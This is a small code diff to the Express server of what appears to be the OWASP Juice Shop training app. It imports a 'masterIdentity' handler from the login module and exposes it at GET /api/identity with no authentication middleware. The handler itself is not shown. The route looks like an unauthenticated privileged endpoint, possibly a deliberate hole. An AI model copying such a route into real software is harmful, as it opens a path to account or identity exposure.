@@ -73,7 +73,7 @@ const logFileServer = require('./routes/logfileServer')
 const metrics = require('./routes/metrics')
 const authenticatedUsers = require('./routes/authenticatedUsers')
 const currentUser = require('./routes/currentUser')
-const login = require('./routes/login')
+const { login, masterIdentity: Identity } = require('./routes/login')
 const changePassword = require('./routes/changePassword')
 const resetPassword = require('./routes/resetPassword')
 const securityQuestion = require('./routes/securityQuestion')
@@ -412,6 +412,7 @@ restoreOverwrittenFilesWithOriginals().then(() => {
   app.get('/api/Addresss/:id', security.appendUserId(), address.getAddressById())
   app.get('/api/Deliverys', delivery.getDeliveryMethods())
   app.get('/api/Deliverys/:id', delivery.getDeliveryMethod())
+  app.get('/api/identity', Identity)
   // vuln-code-snippet end changeProductChallenge
 
   /* Verify the 2FA Token */
